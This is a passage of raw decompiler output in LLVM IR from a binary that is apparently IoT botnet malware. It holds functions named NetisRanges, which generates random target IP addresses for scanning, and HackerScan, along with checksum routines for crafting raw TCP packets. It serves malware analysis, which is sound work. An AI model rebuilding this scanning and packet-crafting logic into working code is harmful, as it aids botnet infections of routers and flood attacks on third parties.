  %v2_804ca0f.pre-phi = phi i32 [ %.pre, %dec_label_pc_804c9d6.dec_label_pc_804ca0f_crit_edge ], [ undef, %dec_label_pc_804c9df ]
  %v1_804ca15 = call i32 @inet_addr(i32 %v2_804ca0f.pre-phi)
  %v2_804ca1d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ca1d, i32* @ebx, align 4
  ret i32 %v1_804ca15

; uselistorder directives
  uselistorder i32 %v2_804c830, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8049cba, { 1, 0 }
  uselistorder i32 %v2_8049c7a, { 1, 0 }
  uselistorder i32 %v2_8049c3a, { 1, 0 }
  uselistorder i32 %v2_8049bfa, { 1, 0 }
  uselistorder label %dec_label_pc_804ca0f, { 1, 0 }
  uselistorder label %dec_label_pc_804c9d6, { 1, 0 }
  uselistorder label %dec_label_pc_804c99d, { 1, 0 }
  uselistorder label %dec_label_pc_804c964, { 1, 0 }
  uselistorder label %dec_label_pc_804c92b, { 1, 0 }
  uselistorder label %dec_label_pc_804c8f2, { 1, 0 }
  uselistorder label %dec_label_pc_804c8b9, { 1, 0 }
  uselistorder label %dec_label_pc_804c880, { 1, 0 }
  uselistorder label %dec_label_pc_804c80e, { 1, 0 }
  uselistorder label %dec_label_pc_804c7d5, { 1, 0 }
  uselistorder label %dec_label_pc_804c79c, { 1, 0 }
  uselistorder label %dec_label_pc_804c763, { 1, 0 }
  uselistorder label %dec_label_pc_804c72a, { 1, 0 }
  uselistorder label %dec_label_pc_804c6f1, { 1, 0 }
  uselistorder label %dec_label_pc_804c6b8, { 1, 0 }
  uselistorder label %dec_label_pc_804c67f, { 1, 0 }
  uselistorder label %dec_label_pc_804c646, { 1, 0 }
  uselistorder label %dec_label_pc_804c60d, { 1, 0 }
  uselistorder label %dec_label_pc_804c5d4, { 1, 0 }
  uselistorder label %dec_label_pc_804c59b, { 1, 0 }
  uselistorder label %dec_label_pc_804c562, { 1, 0 }
  uselistorder label %dec_label_pc_804c529, { 1, 0 }
  uselistorder label %dec_label_pc_804c4f0, { 1, 0 }
  uselistorder label %dec_label_pc_804c4b7, { 1, 0 }
  uselistorder label %dec_label_pc_804c47e, { 1, 0 }
  uselistorder label %dec_label_pc_804c445, { 1, 0 }
  uselistorder label %dec_label_pc_804c40c, { 1, 0 }
  uselistorder label %dec_label_pc_804c3d3, { 1, 0 }
  uselistorder label %dec_label_pc_804c39a, { 1, 0 }
  uselistorder label %dec_label_pc_804c361, { 1, 0 }
  uselistorder label %dec_label_pc_804c328, { 1, 0 }
  uselistorder label %dec_label_pc_804c2ef, { 1, 0 }
  uselistorder label %dec_label_pc_804c2b6, { 1, 0 }
  uselistorder label %dec_label_pc_804c27d, { 1, 0 }
  uselistorder label %dec_label_pc_804c244, { 1, 0 }
  uselistorder label %dec_label_pc_804c20b, { 1, 0 }
  uselistorder label %dec_label_pc_804c1d2, { 1, 0 }
  uselistorder label %dec_label_pc_804c199, { 1, 0 }
  uselistorder label %dec_label_pc_804c160, { 1, 0 }
  uselistorder label %dec_label_pc_804c127, { 1, 0 }
  uselistorder label %dec_label_pc_804c0ee, { 1, 0 }
  uselistorder label %dec_label_pc_804c0b5, { 1, 0 }
  uselistorder label %dec_label_pc_804c07c, { 1, 0 }
  uselistorder label %dec_label_pc_804c043, { 1, 0 }
  uselistorder label %dec_label_pc_804c00a, { 1, 0 }
  uselistorder label %dec_label_pc_804bfd1, { 1, 0 }
  uselistorder label %dec_label_pc_804bf98, { 1, 0 }
  uselistorder label %dec_label_pc_804bf5f, { 1, 0 }
  uselistorder label %dec_label_pc_804bf26, { 1, 0 }
  uselistorder label %dec_label_pc_804beed, { 1, 0 }
  uselistorder label %dec_label_pc_804beb4, { 1, 0 }
  uselistorder label %dec_label_pc_804be7b, { 1, 0 }
  uselistorder label %dec_label_pc_804be42, { 1, 0 }
  uselistorder label %dec_label_pc_804be09, { 1, 0 }
  uselistorder label %dec_label_pc_804bdd0, { 1, 0 }
  uselistorder label %dec_label_pc_804bd97, { 1, 0 }
  uselistorder label %dec_label_pc_804bd5e, { 1, 0 }
  uselistorder label %dec_label_pc_804bd25, { 1, 0 }
  uselistorder label %dec_label_pc_804bcec, { 1, 0 }
  uselistorder label %dec_label_pc_804bcb3, { 1, 0 }
  uselistorder label %dec_label_pc_804bc7a, { 1, 0 }
  uselistorder label %dec_label_pc_804bc41, { 1, 0 }
  uselistorder label %dec_label_pc_804bc08, { 1, 0 }
  uselistorder label %dec_label_pc_804bbcf, { 1, 0 }
  uselistorder label %dec_label_pc_804bb96, { 1, 0 }
  uselistorder label %dec_label_pc_804bb5d, { 1, 0 }
  uselistorder label %dec_label_pc_804bb24, { 1, 0 }
  uselistorder label %dec_label_pc_804baeb, { 1, 0 }
  uselistorder label %dec_label_pc_804bab2, { 1, 0 }
  uselistorder label %dec_label_pc_804ba79, { 1, 0 }
  uselistorder label %dec_label_pc_804ba40, { 1, 0 }
  uselistorder label %dec_label_pc_804ba07, { 1, 0 }
  uselistorder label %dec_label_pc_804b9ce, { 1, 0 }
  uselistorder label %dec_label_pc_804b995, { 1, 0 }
  uselistorder label %dec_label_pc_804b95c, { 1, 0 }
  uselistorder label %dec_label_pc_804b923, { 1, 0 }
  uselistorder label %dec_label_pc_804b8ea, { 1, 0 }
  uselistorder label %dec_label_pc_804b8b1, { 1, 0 }
  uselistorder label %dec_label_pc_804b878, { 1, 0 }
  uselistorder label %dec_label_pc_804b83f, { 1, 0 }
  uselistorder label %dec_label_pc_804b806, { 1, 0 }
  uselistorder label %dec_label_pc_804b7d0, { 1, 0 }
  uselistorder label %dec_label_pc_804b79a, { 1, 0 }
  uselistorder label %dec_label_pc_804b764, { 1, 0 }
  uselistorder label %dec_label_pc_804b72e, { 1, 0 }
  uselistorder label %dec_label_pc_804b6f8, { 1, 0 }
  uselistorder label %dec_label_pc_804b6c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b68c, { 1, 0 }
  uselistorder label %dec_label_pc_804b656, { 1, 0 }
  uselistorder label %dec_label_pc_804b620, { 1, 0 }
  uselistorder label %dec_label_pc_804b5ea, { 1, 0 }
  uselistorder label %dec_label_pc_804b5b4, { 1, 0 }
  uselistorder label %dec_label_pc_804b57e, { 1, 0 }
  uselistorder label %dec_label_pc_804b548, { 1, 0 }
  uselistorder label %dec_label_pc_804b512, { 1, 0 }
  uselistorder label %dec_label_pc_804b4dc, { 1, 0 }
  uselistorder label %dec_label_pc_804b4a6, { 1, 0 }
  uselistorder label %dec_label_pc_804b470, { 1, 0 }
  uselistorder label %dec_label_pc_804b43a, { 1, 0 }
  uselistorder label %dec_label_pc_804b404, { 1, 0 }
  uselistorder label %dec_label_pc_804b3ce, { 1, 0 }
  uselistorder label %dec_label_pc_804b398, { 1, 0 }
  uselistorder label %dec_label_pc_804b362, { 1, 0 }
  uselistorder label %dec_label_pc_804b32c, { 1, 0 }
  uselistorder label %dec_label_pc_804b2f6, { 1, 0 }
  uselistorder label %dec_label_pc_804b2c0, { 1, 0 }
  uselistorder label %dec_label_pc_804b28a, { 1, 0 }
  uselistorder label %dec_label_pc_804b254, { 1, 0 }
  uselistorder label %dec_label_pc_804b21e, { 1, 0 }
  uselistorder label %dec_label_pc_804b1e8, { 1, 0 }
  uselistorder label %dec_label_pc_804b1b2, { 1, 0 }
  uselistorder label %dec_label_pc_804b17c, { 1, 0 }
  uselistorder label %dec_label_pc_804b146, { 1, 0 }
  uselistorder label %dec_label_pc_804b110, { 1, 0 }
  uselistorder label %dec_label_pc_804b0da, { 1, 0 }
  uselistorder label %dec_label_pc_804b0a4, { 1, 0 }
  uselistorder label %dec_label_pc_804b06e, { 1, 0 }
  uselistorder label %dec_label_pc_804b038, { 1, 0 }
  uselistorder label %dec_label_pc_804b002, { 1, 0 }
  uselistorder label %dec_label_pc_804afcc, { 1, 0 }
  uselistorder label %dec_label_pc_804af96, { 1, 0 }
  uselistorder label %dec_label_pc_804af60, { 1, 0 }
  uselistorder label %dec_label_pc_804af2a, { 1, 0 }
  uselistorder label %dec_label_pc_804aef4, { 1, 0 }
  uselistorder label %dec_label_pc_804aebe, { 1, 0 }
  uselistorder label %dec_label_pc_804ae88, { 1, 0 }
  uselistorder label %dec_label_pc_804ae52, { 1, 0 }
  uselistorder label %dec_label_pc_804ae1c, { 1, 0 }
  uselistorder label %dec_label_pc_804ade6, { 1, 0 }
  uselistorder label %dec_label_pc_804adb0, { 1, 0 }
  uselistorder label %dec_label_pc_804ad7a, { 1, 0 }
  uselistorder label %dec_label_pc_804ad44, { 1, 0 }
  uselistorder label %dec_label_pc_804ad0e, { 1, 0 }
  uselistorder label %dec_label_pc_804acd8, { 1, 0 }
  uselistorder label %dec_label_pc_804aca2, { 1, 0 }
  uselistorder label %dec_label_pc_804ac6c, { 1, 0 }
  uselistorder label %dec_label_pc_804ac36, { 1, 0 }
  uselistorder label %dec_label_pc_804ac00, { 1, 0 }
  uselistorder label %dec_label_pc_804abca, { 1, 0 }
  uselistorder label %dec_label_pc_804ab94, { 1, 0 }
  uselistorder label %dec_label_pc_804ab5e, { 1, 0 }
  uselistorder label %dec_label_pc_804ab28, { 1, 0 }
  uselistorder label %dec_label_pc_804aaf2, { 1, 0 }
  uselistorder label %dec_label_pc_804aabc, { 1, 0 }
  uselistorder label %dec_label_pc_804aa86, { 1, 0 }
  uselistorder label %dec_label_pc_804aa50, { 1, 0 }
  uselistorder label %dec_label_pc_804aa1a, { 1, 0 }
  uselistorder label %dec_label_pc_804a9e4, { 1, 0 }
  uselistorder label %dec_label_pc_804a9ae, { 1, 0 }
  uselistorder label %dec_label_pc_804a978, { 1, 0 }
  uselistorder label %dec_label_pc_804a942, { 1, 0 }
  uselistorder label %dec_label_pc_804a90c, { 1, 0 }
  uselistorder label %dec_label_pc_804a8d6, { 1, 0 }
  uselistorder label %dec_label_pc_804a8a0, { 1, 0 }
  uselistorder label %dec_label_pc_804a86a, { 1, 0 }
  uselistorder label %dec_label_pc_804a834, { 1, 0 }
  uselistorder label %dec_label_pc_804a7fe, { 1, 0 }
  uselistorder label %dec_label_pc_804a7c8, { 1, 0 }
  uselistorder label %dec_label_pc_804a792, { 1, 0 }
  uselistorder label %dec_label_pc_804a75c, { 1, 0 }
  uselistorder label %dec_label_pc_804a726, { 1, 0 }
  uselistorder label %dec_label_pc_804a6f0, { 1, 0 }
  uselistorder label %dec_label_pc_804a6ba, { 1, 0 }
  uselistorder label %dec_label_pc_804a684, { 1, 0 }
  uselistorder label %dec_label_pc_804a64e, { 1, 0 }
  uselistorder label %dec_label_pc_804a618, { 1, 0 }
  uselistorder label %dec_label_pc_804a5e2, { 1, 0 }
  uselistorder label %dec_label_pc_804a5ac, { 1, 0 }
  uselistorder label %dec_label_pc_804a576, { 1, 0 }
  uselistorder label %dec_label_pc_804a540, { 1, 0 }
  uselistorder label %dec_label_pc_804a50a, { 1, 0 }
  uselistorder label %dec_label_pc_804a4d4, { 1, 0 }
  uselistorder label %dec_label_pc_804a49e, { 1, 0 }
  uselistorder label %dec_label_pc_804a468, { 1, 0 }
  uselistorder label %dec_label_pc_804a432, { 1, 0 }
  uselistorder label %dec_label_pc_804a3fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a3c6, { 1, 0 }
  uselistorder label %dec_label_pc_804a390, { 1, 0 }
  uselistorder label %dec_label_pc_804a35a, { 1, 0 }
  uselistorder label %dec_label_pc_804a324, { 1, 0 }
  uselistorder label %dec_label_pc_804a2ee, { 1, 0 }
  uselistorder label %dec_label_pc_804a2b8, { 1, 0 }
  uselistorder label %dec_label_pc_804a282, { 1, 0 }
  uselistorder label %dec_label_pc_804a24c, { 1, 0 }
  uselistorder label %dec_label_pc_804a216, { 1, 0 }
  uselistorder label %dec_label_pc_804a1e0, { 1, 0 }
  uselistorder label %dec_label_pc_804a1aa, { 1, 0 }
  uselistorder label %dec_label_pc_804a174, { 1, 0 }
  uselistorder label %dec_label_pc_804a13e, { 1, 0 }
  uselistorder label %dec_label_pc_804a108, { 1, 0 }
  uselistorder label %dec_label_pc_804a0d2, { 1, 0 }
  uselistorder label %dec_label_pc_804a09c, { 1, 0 }
  uselistorder label %dec_label_pc_804a066, { 1, 0 }
  uselistorder label %dec_label_pc_804a030, { 1, 0 }
  uselistorder label %dec_label_pc_8049ffa, { 1, 0 }
  uselistorder label %dec_label_pc_8049fc4, { 1, 0 }
  uselistorder label %dec_label_pc_8049f8e, { 1, 0 }
  uselistorder label %dec_label_pc_8049f58, { 1, 0 }
  uselistorder label %dec_label_pc_8049f22, { 1, 0 }
  uselistorder label %dec_label_pc_8049eec, { 1, 0 }
  uselistorder label %dec_label_pc_8049eb6, { 1, 0 }
  uselistorder label %dec_label_pc_8049e80, { 1, 0 }
  uselistorder label %dec_label_pc_8049e4a, { 1, 0 }
  uselistorder label %dec_label_pc_8049e14, { 1, 0 }
  uselistorder label %dec_label_pc_8049dde, { 1, 0 }
  uselistorder label %dec_label_pc_8049da8, { 1, 0 }
  uselistorder label %dec_label_pc_8049d72, { 1, 0 }
  uselistorder label %dec_label_pc_8049d3c, { 1, 0 }
}

define i32 @NetisRanges(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ca23 = load i32, i32* @edi, align 4
  %v0_804ca24 = load i32, i32* @esi, align 4
  %v0_804ca25 = load i32, i32* @ebx, align 4
  store i32 %v0_804ca25, i32* %stack_var_-16, align 4
  %v1_804ca29 = call i32 @random()
  %v2_804ca3a = zext i32 %v1_804ca29 to i64
  %v4_804ca3a = mul nuw i64 %v2_804ca3a, 2290649225
  %v2_804ca3e7 = udiv i64 %v4_804ca3a, 68719476736
  %v2_804ca4711 = mul nuw nsw i64 %v2_804ca3e7, 2
  %v2_804ca47 = trunc i64 %v2_804ca4711 to i32
  %v2_804ca4c13 = mul nuw nsw i64 %v2_804ca3e7, 32
  %v2_804ca4c = trunc i64 %v2_804ca4c13 to i32
  %v2_804ca4f36 = sub i32 %v2_804ca47, %v2_804ca4c
  %v2_804ca53 = add i32 %v1_804ca29, %v2_804ca4f36
  store i32 %v2_804ca53, i32* @ebx, align 4
  %v1_804ca61 = mul i32 %v2_804ca53, 4
  %v2_804ca61 = add i32 %v1_804ca61, ptrtoint (i32* @global_var_805f1c0.229 to i32)
  %v3_804ca61 = inttoptr i32 %v2_804ca61 to i32*
  %v4_804ca61 = load i32, i32* %v3_804ca61, align 4
  store i32 %v4_804ca61, i32* @eax, align 4
  %v1_804ca68 = trunc i32 %v4_804ca61 to i8
  store i8 %v1_804ca68, i8* @global_var_805f4f7.27, align 1
  %v1_804ca6d = call i32 @random()
  %v2_804ca8f = sdiv i32 %v1_804ca6d, 51
  store i32 %v2_804ca8f, i32* @ebx, align 4
  %tmp = mul i32 %v2_804ca8f, -255
  %v2_804ca9f = add i32 %v1_804ca6d, %tmp
  %v14_804ca9f = trunc i32 %v2_804ca9f to i8
  store i32 %v2_804ca9f, i32* @eax, align 4
  store i8 %v14_804ca9f, i8* @global_var_805f4f8.28, align 8
  %v1_804caad = call i32 @random()
  %v2_804cacf = sdiv i32 %v1_804caad, 51
  store i32 %v2_804cacf, i32* @ebx, align 4
  %tmp37 = mul i32 %v2_804cacf, -255
  %v2_804cadf = add i32 %v1_804caad, %tmp37
  %v14_804cadf = trunc i32 %v2_804cadf to i8
  store i32 %v2_804cadf, i32* @eax, align 4
  store i8 %v14_804cadf, i8* @global_var_805f4f9.29, align 1
  %v1_804caed = call i32 @random()
  %v2_804cb0f = sdiv i32 %v1_804caed, 51
  %tmp38 = mul i32 %v2_804cb0f, -255
  %v2_804cb1f = add i32 %v1_804caed, %tmp38
  %v14_804cb1f = trunc i32 %v2_804cb1f to i8
  store i8 %v14_804cb1f, i8* @global_var_805f4fa.30, align 2
  store i32 0, i32* %stack_var_-36, align 4
  %v0_804cb49 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804cb49 = zext i8 %v0_804cb49 to i32
  store i32 %v1_804cb49, i32* @edx, align 4
  %v0_804cb5d = load i8, i8* @global_var_805f4f7.27, align 1
  %v1_804cb5d = zext i8 %v0_804cb5d to i32
  store i32 %v1_804cb5d, i32* @ebx, align 4
  %v0_804cb67 = load i8, i8* @global_var_805f4f6.230, align 2
  %v1_804cb67 = zext i8 %v0_804cb67 to i32
  %v2_804cb76 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804cb76, i32* @edi, align 4
  %v4_804cb90 = call i32 @szprintf(i32 %v2_804cb76, i32 ptrtoint ([12 x i8]* @global_var_8059cdd.231 to i32), i32 %v1_804cb67)
  %v1_804cb9b = call i32 @inet_addr(i32 %v2_804cb76)
  %v2_804cba3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cba3, i32* @ebx, align 4
  store i32 %v0_804ca24, i32* @esi, align 4
  store i32 %v0_804ca23, i32* @edi, align 4
  ret i32 %v1_804cb9b

; uselistorder directives
  uselistorder i32 %v2_804cadf, { 1, 0 }
  uselistorder i32 %v2_804ca9f, { 1, 0 }
  uselistorder i32 %v2_804ca53, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i8* @global_var_805f4fa.30, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805f4f9.29, { 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805f4f8.28, { 2, 1, 0 }
  uselistorder i8* @global_var_805f4f7.27, { 3, 2, 1, 0 }
}

define i32 @HackerScan(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804cbae = load i32, i32* @global_var_8065768.232, align 8
  %v1_804cbb6 = call i32 @ntohl(i32 %v0_804cbae)
  %v5_804cbbb = and i32 %v1_804cbb6, %arg1
  %v1_804cbc1 = call i32 @rand_cmwc(i32 %v5_804cbbb)
  %v1_804cbcb = sub i32 -1, %arg1
  %v2_804cbcd = and i32 %v1_804cbc1, %v1_804cbcb
  %v5_804cbcf = xor i32 %v2_804cbcd, %v5_804cbbb
  ret i32 %v5_804cbcf
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804cbd9 = load i32, i32* @ebx, align 4
  %v4_804cc0833 = add i32 %arg2, -1
  %v9_804cc0834 = sub i32 0, %arg2
  %v10_804cc0835 = and i32 %arg2, %v9_804cc0834
  %v11_804cc0836 = icmp slt i32 %v10_804cc0835, 0
  %v12_804cc0837 = icmp eq i32 %v4_804cc0833, 0
  %v13_804cc0838 = icmp slt i32 %v4_804cc0833, 0
  %v3_804cc0c39 = icmp eq i1 %v13_804cc0838, %v11_804cc0836
  %v4_804cc0c40 = icmp eq i1 %v12_804cc0837, false
  %v5_804cc0c41 = and i1 %v4_804cc0c40, %v3_804cc0c39
  br i1 %v5_804cc0c41, label %dec_label_pc_804cbed, label %dec_label_pc_804cc0e

dec_label_pc_804cbed:                             ; preds = %entry, %dec_label_pc_804cbed
  %stack_var_-24.045 = phi i16 [ %v9_804cbfd, %dec_label_pc_804cbed ], [ 0, %entry ]
  %stack_var_8.044 = phi i32 [ %v4_804cc04, %dec_label_pc_804cbed ], [ %arg2, %entry ]
  %stack_var_4.043 = phi i16* [ %v23_804cc00, %dec_label_pc_804cbed ], [ %arg1, %entry ]
  %v3_804cbfa42 = phi i32 [ %v6_804cbfa, %dec_label_pc_804cbed ], [ 0, %entry ]
  %v4_804cbed = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804cbf0 = load i16, i16* %stack_var_4.043, align 2
  %v3_804cbf0 = zext i16 %v2_804cbf0 to i32
  %sext51 = mul i32 %v3_804cbfa42, 65536
  %v4_804cbfa = sdiv i32 %sext51, 65536
  %v6_804cbfa = add nsw i32 %v3_804cbf0, %v4_804cbfa
  %v11_804cbfa = icmp ult i32 %v6_804cbfa, %v4_804cbfa
  %v26_804cbfa = trunc i32 %v6_804cbfa to i16
  %v7_804cbfd = zext i1 %v11_804cbfa to i16
  %v9_804cbfd = add i16 %v7_804cbfd, %stack_var_-24.045
  %v5_804cc00 = add i32 %v4_804cbed, 2
  %v23_804cc00 = inttoptr i32 %v5_804cc00 to i16*
  %v4_804cc04 = add i32 %stack_var_8.044, -2
  %v4_804cc08 = add i32 %stack_var_8.044, -3
  %v9_804cc08 = sub i32 2, %stack_var_8.044
  %v10_804cc08 = and i32 %v4_804cc04, %v9_804cc08
  %v11_804cc08 = icmp slt i32 %v10_804cc08, 0
  %v12_804cc08 = icmp eq i32 %v4_804cc08, 0
  %v13_804cc08 = icmp slt i32 %v4_804cc08, 0
  %v3_804cc0c = icmp eq i1 %v13_804cc08, %v11_804cc08
  %v4_804cc0c = icmp eq i1 %v12_804cc08, false
  %v5_804cc0c = and i1 %v4_804cc0c, %v3_804cc0c
  br i1 %v5_804cc0c, label %dec_label_pc_804cbed, label %dec_label_pc_804cc0e

dec_label_pc_804cc0e:                             ; preds = %dec_label_pc_804cbed, %entry
  %v3_804cbfa.lcssa = phi i16 [ 0, %entry ], [ %v26_804cbfa, %dec_label_pc_804cbed ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804cc00, %dec_label_pc_804cbed ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804cc04, %dec_label_pc_804cbed ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804cbfd, %dec_label_pc_804cbed ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804cc4f.preheader, label %dec_label_pc_804cc14

dec_label_pc_804cc14:                             ; preds = %dec_label_pc_804cc0e
  %v1_804cc17 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804cc17 = load i8, i8* %v1_804cc17, align 1
  %v3_804cc17 = zext i8 %v2_804cc17 to i32
  %v4_804cc22 = sext i16 %v3_804cbfa.lcssa to i32
  %v6_804cc22 = add nsw i32 %v3_804cc17, %v4_804cc22
  %v11_804cc22 = icmp ult i32 %v6_804cc22, %v4_804cc22
  %v26_804cc22 = trunc i32 %v6_804cc22 to i16
  %v7_804cc25 = zext i1 %v11_804cc22 to i16
  %v9_804cc25 = add i16 %v7_804cc25, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804cc4f.preheader

dec_label_pc_804cc4f.preheader:                   ; preds = %dec_label_pc_804cc14, %dec_label_pc_804cc0e
  %v3_804cc34.ph = phi i16 [ %v3_804cbfa.lcssa, %dec_label_pc_804cc0e ], [ %v26_804cc22, %dec_label_pc_804cc14 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804cc0e ], [ %v9_804cc25, %dec_label_pc_804cc14 ]
  %v4_804cc4f20 = sext i16 %v3_804cc34.ph to i32
  %v4_804cc5221 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804cc5522 = udiv i32 %v4_804cc4f20, 65536
  %v4_804cc5523 = mul i32 %v4_804cc5221, 65536
  %v5_804cc5524 = or i32 %v4_804cc5523, %v3_804cc5522
  %v2_804cc5925 = udiv i32 %v4_804cc5221, 65536
  %v2_804cc5c26 = or i32 %v5_804cc5524, %v2_804cc5925
  %v3_804cc5c27 = icmp eq i32 %v2_804cc5c26, 0
  %v1_804cc6028 = icmp eq i1 %v3_804cc5c27, false
  br i1 %v1_804cc6028, label %dec_label_pc_804cc2a, label %dec_label_pc_804cc62

dec_label_pc_804cc2a:                             ; preds = %dec_label_pc_804cc4f.preheader, %dec_label_pc_804cc2a
  %v2_804cc5931 = phi i32 [ %v2_804cc59, %dec_label_pc_804cc2a ], [ %v2_804cc5925, %dec_label_pc_804cc4f.preheader ]
  %v5_804cc5530 = phi i32 [ %v5_804cc55, %dec_label_pc_804cc2a ], [ %v5_804cc5524, %dec_label_pc_804cc4f.preheader ]
  %v4_804cc4f29 = phi i32 [ %v4_804cc4f, %dec_label_pc_804cc2a ], [ %v4_804cc4f20, %dec_label_pc_804cc4f.preheader ]
  %v2_804cc45 = add i32 %v5_804cc5530, %v4_804cc4f29
  %v7_804cc45 = icmp ult i32 %v2_804cc45, %v4_804cc4f29
  %v3_804cc47 = zext i1 %v7_804cc45 to i32
  %v5_804cc47 = add nuw nsw i32 %v3_804cc47, %v2_804cc5931
  %sext = mul i32 %v2_804cc45, 65536
  %v4_804cc4f = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804cc47, 65536
  %v4_804cc52 = sdiv i32 %sext50, 65536
  %v3_804cc55 = udiv i32 %v4_804cc4f, 65536
  %v5_804cc55 = or i32 %sext50, %v3_804cc55
  %v2_804cc59 = udiv i32 %v4_804cc52, 65536
  %v2_804cc5c = or i32 %v5_804cc55, %v2_804cc59
  %v3_804cc5c = icmp eq i32 %v2_804cc5c, 0
  %v1_804cc60 = icmp eq i1 %v3_804cc5c, false
  br i1 %v1_804cc60, label %dec_label_pc_804cc2a, label %dec_label_pc_804cc4f.dec_label_pc_804cc62_crit_edge

dec_label_pc_804cc4f.dec_label_pc_804cc62_crit_edge: ; preds = %dec_label_pc_804cc2a
  br label %dec_label_pc_804cc62

dec_label_pc_804cc62:                             ; preds = %dec_label_pc_804cc4f.dec_label_pc_804cc62_crit_edge, %dec_label_pc_804cc4f.preheader
  %v4_804cc4f.lcssa = phi i32 [ %v4_804cc4f, %dec_label_pc_804cc4f.dec_label_pc_804cc62_crit_edge ], [ %v4_804cc4f20, %dec_label_pc_804cc4f.preheader ]
  %v1_804cc66 = urem i32 %v4_804cc4f.lcssa, 65536
  %v1_804cc68 = xor i32 %v1_804cc66, 65535
  store i32 %v0_804cbd9, i32* @ebx, align 4
  ret i32 %v1_804cc68

; uselistorder directives
  uselistorder i32 %v5_804cc55, { 1, 0 }
  uselistorder i32 %v4_804cc4f, { 1, 0, 2 }
  uselistorder i32 %v2_804cc5925, { 1, 0 }
  uselistorder i32 %v4_804cc5221, { 1, 0 }
  uselistorder i32 %v4_804cc4f20, { 2, 1, 0 }
  uselistorder i32 %v4_804cc22, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804cbfa.lcssa, { 1, 0 }
  uselistorder i32 %v4_804cc08, { 1, 0 }
  uselistorder i32 %v4_804cc04, { 0, 2, 1 }
  uselistorder i32 %v6_804cbfa, { 1, 2, 0 }
  uselistorder i32 %v4_804cbfa, { 1, 0 }
  uselistorder label %dec_label_pc_804cc2a, { 1, 0 }
  uselistorder label %dec_label_pc_804cbed, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cc73 = load i32, i32* @ebp, align 4
  store i32 %v0_804cc73, i32* %stack_var_-4, align 4
  %v4_804cc73 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cc73, i32* @ebp, align 4
  %v1_804cc87 = add i32 %tmp10, 12
  %v2_804cc87 = inttoptr i32 %v1_804cc87 to i32*
  %v3_804cc87 = load i32, i32* %v2_804cc87, align 4
  %v1_804cc90 = add i32 %tmp10, 16
  %v2_804cc90 = inttoptr i32 %v1_804cc90 to i32*
